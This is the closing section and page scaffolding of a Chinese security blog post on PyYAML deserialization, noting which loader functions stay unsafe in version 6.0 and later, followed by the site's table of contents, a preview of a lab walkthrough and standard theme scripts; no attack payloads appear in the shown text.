+<h4 id="03：Pyaml库版本-6-0"><a href="#03：Pyaml库版本-6-0" class="headerlink" title="03：Pyaml库版本&gt;&#x3D;6.0"></a>03：Pyaml库版本&gt;&#x3D;6.0</h4><p>易受攻击的只有<code>yaml.unsafe_load</code> 和 <code>yaml.load(input, Loader=yaml.UnsafeLoader)</code></p>
+<p>payload没有变化</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://web218.github.io">K1r1t5u6u</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://web218.github.io/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://web218.github.io/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://web218.github.io" target="_blank">K1r1t5u6uのHexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/PyYAML/">PyYAML</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post-share"><div class="social-share" data-image="/images/wgqs.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/08/THL%E9%9D%B6%E6%9C%BA--Out_Of_Band/" title="THL靶机--Out_Of_Band"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">THL靶机--Out_Of_Band</div></div><div class="info-2"><div class="info-item-1">THL – Out Of Band一.主机发现和信息收集由于靶机自动获取ip且成功显示，我们不需要额外进行主机发现，这里我们直接进行信息收集即可 123456789101112131415╭─ /home/kali/Desktop ···································· with root@kali at 22:12:01 ─╮╰─❯ nmap -sT -p- --min-rate=10000 192.168.84.145                                      ─╯Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 22:12 EDTNmap scan report for 192.168.84.145Host is up (0.45s latency).Not shown: 41172 closed tcp ports (conn-refused), 24360 filtered tcp ports (no-response)PORT     STATE...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/wgqs.jpg" onerror="this.onerror=null;this.src='/images/1.png'" alt="avatar"/></div><div class="author-info-name">K1r1t5u6u</div><div class="author-info-description">今夕何夕，见此良人</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/web218"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/web218" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #181717;"></i></a><a class="social-icon" href="https://space.bilibili.com/3537106320230948" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #FF8EB3;"></i></a><a class="social-icon" href="https://qm.qq.com/q/3nByicuAkg" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #87CEEB;"></i></a><a class="social-icon" href="https://mail.163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #8E71C1;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">逆水行舟不进则退</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">一.Pyaml反序列化攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-yaml%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">0x01: yaml的基本语法结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-Pyaml%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">0x02: Pyaml的简单使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-Pyaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">0x03:Pyaml 反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#01%EF%BC%9APyaml%E5%BA%93%E7%89%88%E6%9C%AC-5-1"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">01：Pyaml库版本&lt; &#x3D;5.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02%EF%BC%9A-Python-Object-%E8%A7%A3%E9%87%8A%E5%99%A8"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">02：!!Python\Object:解释器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1python-object-apply"><span class="toc-number">1.0.0.5.1.</span> <span class="toc-text">2.1python&#x2F;object&#x2F;apply</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-python-name"><span class="toc-number">1.0.0.5.2.</span> <span class="toc-text">2.2:!!python\name</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-python-object-new"><span class="toc-number">1.0.0.5.3.</span> <span class="toc-text">2.3 !!python&#x2F;object&#x2F;new</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9ACVE-2020-1747"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">补充：CVE-2020-1747</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A-HDCTF-2023-YamiYami"><span class="toc-number">1.0.0.6.1.</span> <span class="toc-text">题目：[HDCTF 2023]YamiYami</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03%EF%BC%9APyaml%E5%BA%93%E7%89%88%E6%9C%AC-6-0"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">03：Pyaml库版本&gt;&#x3D;6.0</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Web安全--Pyaml反序列化">Web安全--Pyaml反序列化</a><time datetime="2026-09-17T10:03:30.714Z" title="发表于 2026-09-17 18:03:30">2026-09-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/08/THL%E9%9D%B6%E6%9C%BA--Out_Of_Band/" title="THL靶机--Out_Of_Band">THL靶机--Out_Of_Band</a><time datetime="2026-08-08T03:00:30.857Z" title="发表于 2026-08-08 11:00:30">2026-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/06/Vulnhub%E9%9D%B6%E6%9C%BA--pwnos2.0/" title="Vulnhub靶机--pwnos2.0">Vulnhub靶机--pwnos2.0</a><time datetime="2026-08-06T12:20:00.000Z" title="发表于 2026-08-06 20:20:00">2026-08-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/25/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="刷题记录">刷题记录</a><time datetime="2026-07-25T11:39:48.499Z" title="发表于 2026-07-25 19:39:48">2026-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/24/thinkphp/php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" title="PHP面向对象编程基础">PHP面向对象编程基础</a><time datetime="2026-07-24T07:35:37.870Z" title="发表于 2026-07-24 15:35:37">2026-07-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By K1r1t5u6u</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.6.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.6.1"></script><script src="/js/main.js?v=5.6.1"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+  const getUtterancesTheme = theme => theme === 'dark' ? 'github-dark' : 'github-light'
+
+  const loadUtterances = (el = document, key) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyUtterances = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const config = {
+      src: 'https://utteranc.es/client.js',
+      repo: 'web218/web218.github.io',
+      theme: getUtterancesTheme(document.documentElement.getAttribute('data-theme')),
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      'issue-term': isShuoshuo ? key : (option && option['issue-term']) || 'pathname'
+    }
+
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => ele.setAttribute(key, value))
+    el.querySelector('#utterances-wrap').appendChild(ele)
+  }
+
+  const changeUtterancesTheme = theme => {
+    const iframe = document.querySelector('#utterances-wrap iframe')
+    if (iframe) {
+      const message = {
+        type: 'set-theme',
+        theme: getUtterancesTheme(theme)
+      };
+      iframe.contentWindow.postMessage(message, 'https://utteranc.es')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeUtterancesTheme, 'utterances')
+
+  if (isShuoshuo) {
+    'Utterances' === 'Utterances'
+      ? window.shuoshuoComment = { loadComment: loadUtterances }
+      : window.loadOtherComment = loadUtterances
+    return
+  }
+  
+  if ('Utterances' === 'Utterances' || !false) {
+    if (false) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
+    else loadUtterances()
+  } else {
+    window.loadOtherComment = loadUtterances
+  }
+})()</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.6.1"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '0.5s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__fadeInUp');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '0.3s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://unpkg.zhimg.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://unpkg.zhimg.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer');
+    var item_html = '<div id="workboard"></div><div id="ghbdages" style="overflow:hidden;max-height:90px;height:auto;text-align:center;margin-top:10px"><div class="swiper-wrapper"><div class="swiper-slide"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题为Butterfly"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/web218/web218.github.io" style="margin-inline:5px" title="本站源码由Github托管"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a></div></div></div><style>a.github-badge:hover:before {display:none}</style>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.js"></script><script defer src="https://unpkg.zhimg.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify/lib/swiperbdage_init.min.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>
